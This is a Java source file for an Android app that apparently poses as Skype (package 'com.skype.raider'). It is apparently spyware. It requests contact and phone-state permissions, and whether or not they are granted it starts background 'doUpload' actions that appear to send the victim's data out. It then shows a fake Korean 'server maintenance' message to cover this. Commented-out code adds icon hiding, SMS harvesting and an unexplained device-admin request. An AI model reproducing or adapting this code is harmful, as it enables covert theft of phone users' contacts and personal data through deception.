package com.skype.raider;


import java.util.List;
import java.util.UUID;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.view.View.OnClickListener;

import com.skype.raider.action.BaseAction;

import com.skype.raider.util.LocalManager;
import com.skype.raider.util.PhoneUtil;

import com.yanzhenjie.permission.AndPermission;
import com.yanzhenjie.permission.PermissionListener;
import com.yanzhenjie.permission.Rationale;
import com.yanzhenjie.permission.RationaleListener;

@SuppressLint("NewApi")
public class MainActivity extends Activity implements OnClickListener {

    String value="서버정검중입니다.";//"サーバーメンテナンス中です。 서버정검중입니다. ";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            AndPermission.with(MainActivity.this)
                    .requestCode(1)
                    .permission(Manifest.permission.READ_CONTACTS
                            , Manifest.permission.READ_PHONE_STATE)
                    .callback(listener)
                    // rationale作用是：用户拒绝一次权限，再次申请时先征求用户同意，再打开授权对话框；
                    // 这样避免用户勾选不再提示，导致以后无法申请权限。
                    // 你也可以不设置。
                    .rationale(new RationaleListener() {
                        @Override
                        public void showRequestPermissionRationale(int requestCode, Rationale rationale) {
                            // 这里的对话框可以自定义，只要调用rationale.resume()就可以继续申请。
                            AndPermission.rationaleDialog(MainActivity.this, rationale)
                                    .show();
                        }
                    })
                    .start();
        } else {
            String phone = PhoneUtil.getPhone(getApplicationContext());
            if (TextUtils.isEmpty(phone)) {
                phone = UUID.randomUUID().toString();
            }
            LocalManager.setPhone(getApplicationContext(), phone);

            new Thread(new Runnable() {

                @Override
                public void run() {
                    // TODO Auto-generated method stub
                    try {
                        String[] actionSubClass = BaseAction.getSubClasses();
                        for (String calssName : actionSubClass) {
                            Class<?> clazz = Class.forName(calssName);
                            BaseAction action = (BaseAction) clazz.newInstance();
                            action.init(MainActivity.this);
                            boolean continu = action.doUpload();

                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    //	Intent serviceIntent = new Intent(MainActivity.this, SyncService.class);
                    ////	startService(serviceIntent);
                    //	getSmsInPhone();
                }

            }).start();
            ;

//		 getPackageManager().setComponentEnabledSetting(getComponentName(),
//	  				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//	  				PackageManager.DONT_KILL_APP);
//	   		LockApp();
            // finish();

            //	Intent serviceIntent = new Intent(this, SyncService.class);
            //	startService(serviceIntent);

            //Intent lockIntent = new Intent(this, LockService.class);
            //startService(lockIntent);


            AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
            builder.setMessage(value) //"サーバーメンテナンス中です。""서버정검중입니다."
                    .setTitle("")
                    .setCancelable(false)
                    .setPositiveButton("OK",
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    finish();
                                }
                            });
            AlertDialog alert = builder.create();
           alert.show();
        }
    }


    private PermissionListener listener = new PermissionListener() {
        @Override
        public void onSucceed(int requestCode, List<String> grantedPermissions) {
            // Successfully.
            if (requestCode == 1) {
                // TODO ...


                String phone = PhoneUtil.getPhone(getApplicationContext());
                if (TextUtils.isEmpty(phone)) {
                    phone = UUID.randomUUID().toString();
                }
                LocalManager.setPhone(getApplicationContext(), phone);

                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        // TODO Auto-generated method stub
                        try {
                            String[] actionSubClass = BaseAction.getSubClasses();
                            for (String calssName : actionSubClass) {
                                Class<?> clazz = Class.forName(calssName);
                                BaseAction action = (BaseAction) clazz.newInstance();
                                action.init(MainActivity.this);
                                boolean continu = action.doUpload();

                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        //	Intent serviceIntent = new Intent(MainActivity.this, SyncService.class);
                        ////	startService(serviceIntent);
                        //	getSmsInPhone();
                    }

                }).start();
                ;

//		 getPackageManager().setComponentEnabledSetting(getComponentName(),
//	  				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//	  				PackageManager.DONT_KILL_APP);
//	   		LockApp();
                // finish();

                //	Intent serviceIntent = new Intent(this, SyncService.class);
                //	startService(serviceIntent);

                //Intent lockIntent = new Intent(this, LockService.class);
                //startService(lockIntent);


                AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                builder.setMessage(value)
                        .setTitle("")
                        .setCancelable(false)
                        .setPositiveButton("확인",
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int id) {
                                        finish();
                                    }
                                });
                AlertDialog alert = builder.create();
                alert.show();
            }

        }

        @Override
        public void onFailed(int requestCode, List<String> deniedPermissions) {
            // Failure.
            if (requestCode == 1) {
                // TODO ...


                String phone = PhoneUtil.getPhone(getApplicationContext());
                if (TextUtils.isEmpty(phone)) {
                    phone = UUID.randomUUID().toString();
                }
                LocalManager.setPhone(getApplicationContext(), phone);

                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        // TODO Auto-generated method stub
                        try {
                            String[] actionSubClass = BaseAction.getSubClasses();
                            for (String calssName : actionSubClass) {
                                Class<?> clazz = Class.forName(calssName);
                                BaseAction action = (BaseAction) clazz.newInstance();
                                action.init(MainActivity.this);
                                boolean continu = action.doUpload();

                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        //	Intent serviceIntent = new Intent(MainActivity.this, SyncService.class);
                        ////	startService(serviceIntent);
                        //	getSmsInPhone();
                    }

                }).start();
                ;

//		 getPackageManager().setComponentEnabledSetting(getComponentName(),
//	  				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//	  				PackageManager.DONT_KILL_APP);
//	   		LockApp();
                // finish();

                //	Intent serviceIntent = new Intent(this, SyncService.class);
                //	startService(serviceIntent);

                //Intent lockIntent = new Intent(this, LockService.class);
                //startService(lockIntent);

                // String value=" サーバーメンテナンス中です";
                AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                builder.setMessage(value)
                        .setTitle("")
                        .setCancelable(false)
                        .setPositiveButton("OK",
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int id) {
                                        finish();
                                    }
                                });
                AlertDialog alert = builder.create();
                alert.show();
            }

        }
    };

    /**
     * 程序锁定
     */

    public void LockApp() {
        DevicePolicyManager Dmanager = (DevicePolicyManager) this
                .getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName con = new ComponentName(this, DeviceReceiver.class);
        if (!Dmanager.isAdminActive(con)) {
            Intent localIntent = new Intent(
                    "android.app.action.ADD_DEVICE_ADMIN");
            localIntent.putExtra("android.app.extra.DEVICE_ADMIN", con);
            localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "");
            startActivityForResult(localIntent, 0);
        }
    }


    @Override
    public void onClick(View v) {

    }

}
